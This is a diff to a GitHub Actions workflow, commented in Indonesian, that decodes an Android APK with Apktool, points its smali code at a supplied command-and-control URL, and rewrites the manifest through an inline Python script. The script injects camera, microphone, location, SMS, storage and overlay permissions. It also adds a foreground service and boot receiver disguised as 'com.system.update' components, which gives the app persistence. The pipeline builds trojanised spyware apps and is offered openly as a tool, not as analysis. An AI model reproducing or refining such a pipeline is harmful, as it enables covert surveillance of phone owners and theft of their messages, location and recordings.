@@ -52,7 +52,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y wget unzip
+          sudo apt-get install -y wget unzip python3
 
       - name: Download Apktool JAR
         run: |
@@ -97,40 +97,60 @@ jobs:
           find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
           echo "✅ URL C2 diganti"
 
-      - name: Add permissions and service to AndroidManifest.xml (safe insertion before closing tags)
+      - name: Modify AndroidManifest.xml with Python (SAFE)
         run: |
-          MANIFEST="decoded/AndroidManifest.xml"
-          
+          python3 << 'EOF'
+          import xml.etree.ElementTree as ET
+          import re
+
+          MANIFEST_FILE = "decoded/AndroidManifest.xml"
+
+          # Baca file
+          with open(MANIFEST_FILE, 'r') as f:
+              content = f.read()
+
+          # Perbaiki jika ada DUMMYVAL
+          content = re.sub(r'APKTOOL_DUMMYVAL_[^"\s]+', 'dummy', content)
+
           # Tambahkan izin sebelum </manifest>
-          sed -i '/<\/manifest>/i\
-          <uses-permission android:name="android.permission.INTERNET" />\
-          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\
-          <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />\
-          <uses-permission android:name="android.permission.CAMERA" />\
-          <uses-permission android:name="android.permission.RECORD_AUDIO" />\
-          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\
-          <uses-permission android:name="android.permission.READ_SMS" />\
-          <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />\
-          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />\
-          <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />' $MANIFEST
+          permissions = [
+              '<uses-permission android:name="android.permission.INTERNET" />',
+              '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
+              '<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
+              '<uses-permission android:name="android.permission.CAMERA" />',
+              '<uses-permission android:name="android.permission.RECORD_AUDIO" />',
+              '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
+              '<uses-permission android:name="android.permission.READ_SMS" />',
+              '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
+              '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
+              '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />'
+          ]
+          perms_str = '\n    '.join(permissions)
+          content = content.replace('</manifest>', f'    {perms_str}\n</manifest>')
 
           # Tambahkan service dan receiver sebelum </application>
-          sed -i '/<\/application>/i\
-          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />\
-          <receiver android:name="com.system.update.BootReceiver" android:exported="true">\
-              <intent-filter>\
-                  <action android:name="android.intent.action.BOOT_COMPLETED" />\
-                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />\
-              </intent-filter>\
-          </receiver>' $MANIFEST
+          services = '''
+          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />
+          <receiver android:name="com.system.update.BootReceiver" android:exported="true">
+              <intent-filter>
+                  <action android:name="android.intent.action.BOOT_COMPLETED" />
+                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+              </intent-filter>
+          </receiver>
+          '''
+          content = content.replace('</application>', f'{services}\n</application>')
+
+          # Tulis ulang
+          with open(MANIFEST_FILE, 'w') as f:
+              f.write(content)
+
+          print("✅ AndroidManifest.xml berhasil dimodifikasi")
+          EOF
 
       - name: Clean dummy files and references
         run: |
-          # Hapus semua file DUMMYVAL
           find decoded -type f -name "*DUMMYVAL*" -delete 2>/dev/null || true
-          # Hapus referensi DUMMYVAL di semua XML
           find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
-          # Hapus public.xml (sering menjadi sumber error)
           find decoded -name "public.xml" -delete 2>/dev/null || true
           echo "✅ DUMMYVAL berhasil dibersihkan"
 
